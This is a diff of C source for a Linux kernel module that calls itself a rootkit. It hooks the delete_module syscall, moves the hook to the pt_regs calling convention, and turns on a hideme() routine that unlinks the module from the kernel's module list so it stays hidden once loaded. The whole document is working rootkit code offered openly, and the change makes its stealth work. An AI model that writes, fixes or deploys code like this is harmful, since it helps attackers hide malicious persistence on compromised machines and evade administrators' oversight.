@@ -19,18 +19,15 @@
 #include <linux/fs.h>
 
     
-#define rootkit_name "rootkit"
+#define rootkit_name "root_working_hide"
 
 MODULE_LICENSE("GPL");
 MODULE_VERSION("0.02");
 
 
-static asmlinkage long (*orig_delete_module_func)(const char __user *, unsigned int flags);
+static asmlinkage long (*orig_delete_module_func)(const struct pt_regs *);
 static struct list_head *prev_module;
 
-static struct kprobe kp1 = {
-    .symbol_name = "find_module"
-};
 
 static void hideme(void)
 {
@@ -43,42 +40,35 @@ static void showme(void)
     list_add(&THIS_MODULE->list, prev_module);
 }
 
-asmlinkage long delete_module_func(const char __user *name_user, unsigned int flags)
+asmlinkage long delete_module_func(const struct pt_regs *regs)
 {
     long ret;
     //add find_module fuction from kernal
-    typedef struct module(*find_module_t)(const char *name);
-    find_module_t find_module;
-    register_kprobe(&kp1);
-    find_module = (find_module_t) kp1.addr;
-    unregister_kprobe(&kp1);
+
 
     char module_name[MODULE_NAME_LEN];
     int name_len;
     struct module mod;
-
-    printk(KERN_INFO "Delete module called with name %x\n", name_user);
+    const char __user *name_user = (const char __user *)regs->di;
     //copy from user
-    name_len = copy_from_user(module_name, name_user, sizeof(module_name));
+    name_len = copy_from_user(module_name, name_user, MODULE_NAME_LEN -1 );
     printk(KERN_INFO "name_len %d", name_len);
     if (name_len < 0 ) {
         printk(KERN_INFO "failed");
         goto done;     
     }
     //adding null bit at the end
-    module_name[name_len - 1] = '\0';
+    module_name[MODULE_NAME_LEN - 1] = '\0';
     printk(KERN_INFO "module_name: %s\n",module_name);
-    mod = find_module(module_name);
-    printk(KERN_INFO "Module %s was deleted\n", mod.name);
 
-    if  (strcmp(mod.name,rootkit_name) == 0){
+    if  (strcmp(module_name,rootkit_name) == 0){
         printk(KERN_INFO "deleting myself");
         showme();
-    }  
+    } 
 
 done:
-
-    ret = orig_delete_module_func(name_user, flags);    
+    printk(KERN_INFO "done");
+    ret = orig_delete_module_func(regs);    
     return ret;
 }
 
@@ -98,7 +88,7 @@ static int __init rootkit_init(void)
     err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if(err)
         return err;
-    // hideme();
+    hideme();
 
     printk(KERN_INFO "rootkit: Loaded >:-)\n");
 
